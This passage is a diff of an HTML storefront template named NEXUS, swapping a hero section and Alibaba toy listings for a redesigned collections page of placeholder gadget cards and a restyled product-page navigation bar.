@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -580,1130 +579,492 @@
                 <div class="flex items-center justify-between h-16">
                     <div class="flex items-center">
                         <div class="flex-shrink-0">
-                            <span class="tech-font text-2xl font-bold cyber-gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
+                            <span class="text-2xl font-display font-bold cyber-gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
                         </div>
-                        <div class="hidden md:block">
-                            <div class="ml-10 flex items-baseline space-x-4">
-                                <a class="nav-link text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium cursor-pointer" onclick="showPage('home-page')">Home</a>
-                                <a class="nav-link text-white px-3 py-2 rounded-md text-sm font-medium cursor-pointer" onclick="showPage('collections-page')">Products</a>
-                                <a class="nav-link text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium cursor-pointer" onclick="showPage('collections-page')">Collections</a>
-                                <a class="nav-link text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium" onclick="showPage('about-page')">About</a>
-                                <a class="nav-link text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium" onclick="showPage('contact-page')">Contact</a>
+                        <div class="hidden md:block ml-10">
+                            <div class="flex space-x-8">
+                                <a class="text-gray-300 hover:text-cyan-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('home-page')">Home</a>
+                                <a class="text-cyan-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer">Collections</a>
+                                <a class="text-gray-300 hover:text-cyan-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('about-page')">About</a>
+                                <a class="text-gray-300 hover:text-cyan-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('contact-page')">Contact</a>
                             </div>
                         </div>
                     </div>
-                    <div class="hidden md:block">
-                        <div class="ml-4 flex items-center md:ml-6">
-                            <button class="p-1 rounded-full text-gray-400 hover:text-white focus:outline-none">
-                                <i class="fas fa-search h-6 w-6"></i>
-                            </button>
-                            <button class="ml-3 p-1 rounded-full text-gray-400 hover:text-white focus:outline-none" onclick="showPage('cart-page')">
-                                <i class="fas fa-shopping-cart h-6 w-6"></i>
-                            </button>
-                            <button class="ml-3 p-1 rounded-full text-gray-400 hover:text-white focus:outline-none" onclick="showPage('login-page')">
-                                <i class="fas fa-user h-6 w-6"></i>
-                            </button>
-                        </div>
-                    </div>
-                    <div class="-mr-2 flex md:hidden">
-                        <button class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-white hover:bg-gray-700 focus:outline-none">
-                            <i class="fas fa-bars h-6 w-6"></i>
+                    <div class="flex items-center space-x-4">
+                        <button class="p-2 text-gray-300 hover:text-cyan-400 transition-all duration-300" onclick="showPage('cart-page')">
+                            <i class="fas fa-shopping-cart text-lg"></i>
+                        </button>
+                        <button class="px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-white rounded-full font-medium hover:opacity-90 transition-all duration-300" onclick="showPage('login-page')">
+                            Sign In
                         </button>
                     </div>
                 </div>
             </div>
         </nav>
 
-        <!-- Hero Section -->
-        <div class="relative pt-24 pb-32 overflow-hidden">
-            <div class="absolute inset-0">
-                <div class="absolute inset-0 bg-gradient-to-b from-cyan-900 to-black opacity-70"></div>
-                <video autoplay loop muted class="w-full h-full object-cover">
-                    <source src="https://assets.mixkit.co/videos/preview/mixkit-circuit-board-close-up-17203-large.mp4" type="video/mp4">
-                </video>
-            </div>
-            <div class="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="text-center py-20">
-                    <h1 class="tech-font text-5xl md:text-7xl font-extrabold tracking-tight mb-6 glow">
-                        <span class="cyber-gradient-text">NEXUS</span> COLLECTION
-                    </h1>
-                    <p class="max-w-2xl mx-auto text-xl text-gray-300">
-                        Where cutting-edge technology meets exquisite design. Explore our premium selection of the world's most advanced gadgets.
-                    </p>
-                    <div class="mt-10">
-                        <a href="#products" class="btn-hover inline-flex items-center px-8 py-3 border border-transparent text-base font-medium rounded-md text-black bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-500 hover:to-blue-600 transition duration-300">
-                            SHOP NOW
-                            <i class="fas fa-arrow-right ml-2"></i>
-                        </a>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Featured Categories -->
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+        <!-- Collections Content -->
+        <div class="pt-32 pb-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
             <div class="text-center mb-16">
-                <h2 class="tech-font text-3xl font-bold mb-4 cyber-gradient-text">EXPLORE CATEGORIES</h2>
-                <div class="w-20 h-1 bg-cyan-500 mx-auto"></div>
+                <h1 class="text-4xl md:text-5xl font-display font-bold mb-6">
+                    <span class="cyber-gradient-text">Product</span> Collections
+                </h1>
+                <p class="text-gray-400 max-w-2xl mx-auto">
+                    Browse our curated collections of futuristic products designed to elevate your lifestyle
+                </p>
             </div>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
-                <div class="bg-gray-900 bg-opacity-50 rounded-lg p-6 border border-gray-800 hover:border-cyan-500 transition duration-300 cursor-pointer text-center">
-                    <div class="text-cyan-400 text-4xl mb-4">
-                        <i class="fas fa-laptop"></i>
-                    </div>
-                    <h3 class="tech-font text-xl font-medium mb-2">Laptops</h3>
-                    <p class="text-gray-400 text-sm">Ultra-portable powerhouses</p>
-                </div>
-                <div class="bg-gray-900 bg-opacity-50 rounded-lg p-6 border border-gray-800 hover:border-cyan-500 transition duration-300 cursor-pointer text-center">
-                    <div class="text-cyan-400 text-4xl mb-4">
-                        <i class="fas fa-mobile-alt"></i>
-                    </div>
-                    <h3 class="tech-font text-xl font-medium mb-2">Smartphones</h3>
-                    <p class="text-gray-400 text-sm">Next-gen mobile tech</p>
-                </div>
-                <div class="bg-gray-900 bg-opacity-50 rounded-lg p-6 border border-gray-800 hover:border-cyan-500 transition duration-300 cursor-pointer text-center">
-                    <div class="text-cyan-400 text-4xl mb-4">
-                        <i class="fas fa-headphones"></i>
-                    </div>
-                    <h3 class="tech-font text-xl font-medium mb-2">Audio</h3>
-                    <p class="text-gray-400 text-sm">Immersive sound experience</p>
-                </div>
-                <div class="bg-gray-900 bg-opacity-50 rounded-lg p-6 border border-gray-800 hover:border-cyan-500 transition duration-300 cursor-pointer text-center">
-                    <div class="text-cyan-400 text-4xl mb-4">
-                        <i class="fas fa-gamepad"></i>
-                    </div>
-                    <h3 class="tech-font text-xl font-medium mb-2">Gaming</h3>
-                    <p class="text-gray-400 text-sm">Elite gaming gear</p>
-                </div>
-            </div>
-        </div>
 
-        <!-- Products Section -->
-        <div id="products" class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
-            <div class="text-center mb-16">
-                <h2 class="tech-font text-3xl font-bold mb-4 cyber-gradient-text">OUR PREMIUM COLLECTION</h2>
-                <p class="max-w-2xl mx-auto text-gray-400">Handpicked selection of the most advanced tech products on the market</p>
-                <div class="w-20 h-1 bg-cyan-500 mx-auto mt-4"></div>
-            </div>
-            
-            <!-- Filter/Sort Controls -->
-            <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
-                <div class="flex items-center space-x-2">
-                    <span class="text-gray-400">Filter:</span>
-                    <select class="bg-gray-900 border border-gray-700 text-white rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-cyan-500">
-                        <option>All Products</option>
-                        <option>Laptops</option>
-                        <option>Smartphones</option>
-                        <option>Audio</option>
-                        <option>Gaming</option>
-                    </select>
-                </div>
-                <div class="flex items-center space-x-2">
-                    <span class="text-gray-400">Sort by:</span>
-                    <select class="bg-gray-900 border border-gray-700 text-white rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-cyan-500">
-                        <option>Featured</option>
-                        <option>Price: Low to High</option>
-                        <option>Price: High to Low</option>
-                        <option>Newest</option>
-                    </select>
-                </div>
-            </div>
-            
-            <!-- Product Grid -->
-            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
-<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
-    <!-- Product 1: Metal Yoyo -->
-    <div class="product-card bg-gradient-to-b from-gray-900 to-cosmic rounded-xl p-6 border border-gray-800 transition-all duration-500 hover:border-nebula">
-        <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
-            <img src="https://sc04.alicdn.com/kf/Hc7fbb3e2b6344f15aa9de529d5d0cebd0.jpg" alt="Metal Yoyo" class="w-full h-full object-cover">
-        </div>
-        <h3 class="text-xl font-bold mb-2">Metal Yoyo</h3>
-        <p class="text-gray-400 text-sm mb-4">Trending metal yoyo with custom logo/packaging (min 1000 units). 88% customer satisfaction. Delivery: 2-10 days.</p>
-        <div class="flex items-center justify-between">
-            <span class="text-2xl font-bold text-plasma">$87.88 / 100 units</span>
-            <a href="https://www.alibaba.com/product-detail/DL1231230-Hot-Selling-Children-s-Toys_1601063403489.html?spm=a2700.galleryofferlist.normal_offer.d_image.500c13a0gE4AIB" target="_blank" class="px-4 py-2 bg-nebula text-white rounded-full text-sm font-medium hover:bg-opacity-90 transition-all duration-300">View Details</a>
-        </div>
-    </div>
-
-    <!-- Product 2: Kendama -->
-    <div class="product-card bg-gradient-to-b from-gray-900 to-cosmic rounded-xl p-6 border border-gray-800 transition-all duration-500 hover:border-nebula">
-        <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
-            <img src="https://sc04.alicdn.com/kf/Hb80f35f815b0409798dff33813ab13b0M.jpg" alt="Kendama" class="w-full h-full object-cover">
-        </div>
-        <h3 class="text-xl font-bold mb-2">Kendama</h3>
-        <p class="text-gray-400 text-sm mb-4">Japanese cultural wooden toy. Delivery by 1 Sep.</p>
-        <div class="flex items-center justify-between">
-            <span class="text-2xl font-bold text-plasma">$108.23 / 100 units</span>
-            <a href="https://www.alibaba.com/product-detail/Wholesale-Kendama-Wooden-Balls-Popular-Kendama_1600426909798.html?spm=a2700.galleryofferlist.normal_offer.d_image.250113a0n18WRb" target="_blank" class="px-4 py-2 bg-nebula text-white rounded-full text-sm font-medium hover:bg-opacity-90 transition-all duration-300">View Details</a>
-        </div>
-    </div>
-
-    <!-- Product 3: Super High-bouncing Balls -->
-    <div class="product-card bg-gradient-to-b from-gray-900 to-cosmic rounded-xl p-6 border border-gray-800 transition-all duration-500 hover:border-nebula">
-        <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
-            <img src="https://sc04.alicdn.com/kf/H65f26700f3fa4ecf861d2a38b4796eb3m.jpg" alt="Super High-bouncing Balls" class="w-full h-full object-cover">
-        </div>
-        <h3 class="text-xl font-bold mb-2">Super High-bouncing Balls</h3>
-        <p class="text-gray-400 text-sm mb-4">Fun high-bounce balls for kids. Total price includes FedEx shipping.</p>
-        <div class="flex items-center justify-between">
-            <span class="text-2xl font-bold text-plasma">$163.49 / 100 units</span>
-            <a href="https://www.alibaba.com/product-detail/Super-High-Jumping-Ball-Pack-Moon_1601548831173.html?spm=a2700.galleryofferlist.normal_offer.d_image.697e13a03xdEYZ" target="_blank" class="px-4 py-2 bg-nebula text-white rounded-full text-sm font-medium hover:bg-opacity-90 transition-all duration-300">View Details</a>
-        </div>
-    </div>
-
-    <!-- Product 4: Hedgehog Puzzle -->
-    <div class="product-card bg-gradient-to-b from-gray-900 to-cosmic rounded-xl p-6 border border-gray-800 transition-all duration-500 hover:border-nebula">
-        <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
-            <img src="https://sc04.alicdn.com/kf/H476ee7b4a44a4f2db16f86d4ec4c9c70z.jpg" alt="Hedgehog Puzzle" class="w-full h-full object-cover">
-        </div>
-        <h3 class="text-xl font-bold mb-2">Hedgehog Puzzle</h3>
-        <p class="text-gray-400 text-sm mb-4">Cognitive educational puzzle toy. Guaranteed delivery date: 09/09/25. Total price includes FedEx shipping.</p>
-        <div class="flex items-center justify-between">
-            <span class="text-2xl font-bold text-plasma">$386.07 / 100 units</span>
-            <a href="https://www.alibaba.com/product-detail/Montessori-Educational-Puzzle-Hedgehog-Toy-for_1601446011346.html?spm=a2700.galleryofferlist.normal_offer.d_image.41c213a0CIIj53" target="_blank" class="px-4 py-2 bg-nebula text-white rounded-full text-sm font-medium hover:bg-opacity-90 transition-all duration-300">View Details</a>
-        </div>
-    </div>
-</div>
-</div>
-<div class="text-center mt-12">
-                <button class="px-8 py-3 border border-cyan-500 text-cyan-500 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition duration-300">
-                    LOAD MORE PRODUCTS
+            <!-- Collection Filters -->
+            <div class="flex flex-wrap justify-center gap-4 mb-12">
+                <button class="px-6 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 text-white rounded-full font-medium">
+                    All Products
+                </button>
+                <button class="px-6 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                    Smart Wearables
+                </button>
+                <button class="px-6 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                    Home Tech
+                </button>
+                <button class="px-6 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                    Audio
+                </button>
+                <button class="px-6 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                    Accessories
                 </button>
             </div>
-        </div>
-        
-        <!-- Footer (Collections Page Specific) -->
-        <footer class="bg-black py-16 border-t border-gray-800">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="grid grid-cols-1 md:grid-cols-4 gap-12">
-                    <div>
-                        <span class="tech-font text-2xl font-bold cyber-gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
-                        <p class="text-gray-400 mt-4">
-                            Redefining the future of technology with innovative products that blend cutting-edge performance with luxurious design.
-                        </p>
-                        <div class="flex space-x-4 mt-6">
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-facebook-f"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-twitter"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-instagram"></i>
-                            </a>
-                            <a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">
-                                <i class="fab fa-youtube"></i>
-                            </a>
+
+            <!-- Products Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Product 1 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1551269901-5c5e14c25df7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Quantum X Smartwatch" class="w-full h-full object-cover">
+                        <div class="absolute top-4 right-4 bg-cyan-500 text-black text-xs font-bold px-3 py-1 rounded-full">
+                            NEW
                         </div>
                     </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">SHOP</h3>
-                        <ul class="space-y-3">
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Smartwatches</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Smartphones</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Audio</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Drones</a></li>
-                            <li><a class="text-gray-400 hover:text-cyan-400 transition duration-300 cursor-pointer" onclick="showPage('collections-page')">VR Headsets</a></li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">SUPPORT</h3>
-                        <ul class="space-y-3">
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Contact Us</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">FAQs</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Shipping</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Returns</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Warranty</a></li>
-                        </ul>
-                    </div>
-                    <div>
-                        <h3 class="tech-font text-lg font-medium text-white mb-4">COMPANY</h3>
-                        <ul class="space-y-3">
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300" onclick="showPage('about-page')">About Us</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Careers</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Blog</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Press</a></li>
-                            <li><a href="#" class="text-gray-400 hover:text-cyan-400 transition duration-300">Investors</a></li>
-                        </ul>
+                    <h3 class="text-xl font-bold mb-2">Quantum X Smartwatch</h3>
+                    <p class="text-gray-400 text-sm mb-4">Next-gen smartwatch with holographic display and advanced health monitoring</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$249.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page', 'quantum-x')">
+                            View Details
+                        </button>
                     </div>
                 </div>
-                <div class="border-t border-gray-800 mt-16 pt-8 flex flex-col md:flex-row justify-between items-center">
-                    <p class="text-gray-400 text-sm">
-                        © 2023 Nexus Technologies. All rights reserved.
-                    </p>
-                    <div class="flex space-x-6 mt-4 md:mt-0">
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Privacy Policy</a>
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Terms of Service</a>
-                        <a href="#" class="text-gray-400 hover:text-white text-sm transition duration-300">Cookie Policy</a>
+
+                <!-- Product 2 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1590658268037-6bf12165a8df?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Photon Z Foldable Phone" class="w-full h-full object-cover">
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Photon Z Foldable Phone</h3>
+                    <p class="text-gray-400 text-sm mb-4">Seamless foldable display with AI-powered camera system</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$1,199.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page')">
+                            View Details
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Product 3 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1545127398-14699f92334b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Nebula Pro Headphones" class="w-full h-full object-cover">
+                        <div class="absolute top-4 right-4 bg-emerald-500 text-black text-xs font-bold px-3 py-1 rounded-full">
+                            BEST SELLER
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Nebula Pro Headphones</h3>
+                    <p class="text-gray-400 text-sm mb-4">Wireless noise-cancelling headphones with 3D spatial audio</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$349.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page')">
+                            View Details
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Product 4 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1606778303242-8787b2b45be9?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Lumina Smart Home Hub" class="w-full h-full object-cover">
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Lumina Smart Home Hub</h3>
+                    <p class="text-gray-400 text-sm mb-4">Central control for your smart home with AI assistant integration</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$199.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page')">
+                            View Details
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Product 5 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1530893609608-32a9af3aa95c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Orbit Drone Pro" class="w-full h-full object-cover">
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Orbit Drone Pro</h3>
+                    <p class="text-gray-400 text-sm mb-4">4K camera drone with obstacle avoidance and 30-minute flight time</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$499.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page')">
+                            View Details
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Product 6 -->
+                <div class="cyber-gradient-bg rounded-xl p-6 border border-gray-800 hover:border-cyan-500 transition-all duration-500">
+                    <div class="relative h-64 mb-6 overflow-hidden rounded-lg">
+                        <img src="https://images.unsplash.com/photo-1504274066651-8d31a536b11a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80" 
+                             alt="Solar Charger X" class="w-full h-full object-cover">
+                        <div class="absolute top-4 right-4 bg-amber-500 text-black text-xs font-bold px-3 py-1 rounded-full">
+                            ECO
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">Solar Charger X</h3>
+                    <p class="text-gray-400 text-sm mb-4">Portable solar charger with 20,000mAh battery and fast charging</p>
+                    <div class="flex items-center justify-between">
+                        <span class="text-2xl font-bold text-cyan-400">$129.99</span>
+                        <button class="px-4 py-2 bg-cyan-500 text-black rounded-full text-sm font-medium hover:bg-cyan-400 transition-all duration-300" onclick="showPage('product-page')">
+                            View Details
+                        </button>
                     </div>
                 </div>
             </div>
-        </footer>
+
+            <!-- Pagination -->
+            <div class="flex justify-center mt-16">
+                <nav class="flex items-center space-x-2">
+                    <a href="#" class="px-4 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                        <i class="fas fa-chevron-left"></i>
+                    </a>
+                    <a href="#" class="px-4 py-2 bg-cyan-500 text-black rounded-full font-medium">1</a>
+                    <a href="#" class="px-4 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">2</a>
+                    <a href="#" class="px-4 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">3</a>
+                    <a href="#" class="px-4 py-2 border border-cyan-500 text-cyan-400 rounded-full font-medium hover:bg-cyan-500 hover:bg-opacity-10 transition-all duration-300">
+                        <i class="fas fa-chevron-right"></i>
+                    </a>
+                </nav>
+            </div>
+        </div>
     </div>
 
     <!-- Product Page -->
-    <div id="product-page" class="hidden">
+    <div id="product-page" class="hidden min-h-screen">
         <!-- Navigation (Product Page Specific) -->
-        <nav class="bg-black bg-opacity-80 backdrop-blur-md fixed w-full z-50 border-b border-gray-800">
+        <nav class="bg-black bg-opacity-80 backdrop-blur-md border-b border-emerald-500 border-opacity-20 fixed w-full z-50">
             <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="flex justify-between h-16 items-center">
+                <div class="flex items-center justify-between h-16">
                     <div class="flex items-center">
-                        <span class="orbitron text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-emerald-400 cursor-pointer" onclick="showPage('home-page')">
-                            NEXUS
-                        </span>
-                    </div>
-                    <div class="hidden md:flex space-x-8">
-                        <a class="text-gray-300 hover:text-white transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Products</a>
-                        <a class="text-gray-300 hover:text-white transition duration-300 cursor-pointer" onclick="showPage('collections-page')">Collections</a>
-                        <a class="text-gray-300 hover:text-white transition duration-300" onclick="showPage('about-page')">About</a>
-                        <a class="text-gray-300 hover:text-white transition duration-300" onclick="showPage('contact-page')">Contact</a>
+                        <div class="flex-shrink-0">
+                            <span class="text-2xl font-display font-bold emerald-gradient-text cursor-pointer" onclick="showPage('home-page')">NEXUS</span>
+                        </div>
+                        <div class="hidden md:block ml-10">
+                            <div class="flex space-x-8">
+                                <a class="text-gray-300 hover:text-emerald-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('home-page')">Home</a>
+                                <a class="text-gray-300 hover:text-emerald-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('collections-page')">Collections</a>
+                                <a class="text-gray-300 hover:text-emerald-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('about-page')">About</a>
+                                <a class="text-gray-300 hover:text-emerald-400 px-3 py-2 text-sm font-medium transition-all duration-300 cursor-pointer" onclick="showPage('contact-page')">Contact</a>
+                            </div>
+                        </div>
                     </div>
                     <div class="flex items-center space-x-4">
-                        <button class="text-gray-300 hover:text-white transition duration-300">
-                            <i class="fas fa-search text-lg"></i>
-                        </button>
-                        <button class="text-gray-300 hover:text-white transition duration-300" onclick="showPage('cart-page')">
+                        <button class="p-2 text-gray-300 hover:text-emerald-400 transition-all duration-300" onclick="showPage('cart-page')">
                             <i class="fas fa-shopping-cart text-lg"></i>
                         </button>
-                        <button class="text-gray-300 hover:text-white transition duration-300" onclick="showPage('login-page')">
-                            <i class="fas fa-user text-lg"></i>
+                        <button class="px-4 py-2 bg-gradient-to-r from-emerald-500 to-green-500 text-white rounded-full font-medium hover:opacity-90 transition-all duration-300" onclick="showPage('login-page')">
+                            Sign In
                         </button>
                     </div>
                 </div>
             </div>
         </nav>
 
-        <!-- Main Content -->
-        <main class="pt-24 pb-16">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12">
-                    <!-- Product Gallery -->
-                    <div class="space-y-6">
-                        <div class="cyber-gradient-bg rounded-xl p-6 glow-box relative overflow-hidden">
-                            <span class="absolute top-4 right-4 bg-emerald-500 text-black text-xs font-bold px-2 py-1 rounded-full pulse">HOT</span>
-                            <div class="flex justify-center items-center h-96">
-                                <img id="product-detail-image" src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80"
-                                      alt="Quantum X Smartwatch"
-                                      class="h-full object-contain transform hover:scale-105 transition duration-500">
-                            </div>
-                        </div>
-                        <div class="grid grid-cols-4 gap-4">
-                            <div class="cyber-gradient-bg rounded-lg p-2 cursor-pointer hover:glow-box transition duration-300 border border-gray-800 hover:border-emerald-400">
-                                <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80"
-                                      alt="Quantum X Smartwatch - Angle 1"
-                                      class="w-full h-20 object-cover rounded">
-                            </div>
-                            <div class="cyber-gradient-bg rounded-lg p-2 cursor-pointer hover:glow-box transition duration-300 border border-gray-800 hover:border-emerald-400">
-                                <img src="https://images.unsplash.com/photo-1579586337278-3befd40fd17a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=200&q=80"
-                                      alt="Quantum X Smartwatch - Angle 2"
-                                      class="w-full h-20 object-cover rounded">
-                            </div>
-                            <div class="cyber-gradient-bg rounded-lg p-2 cursor-pointer hover:glow-box transition duration-300 border border-gray-800 hover:border-emerald-400">
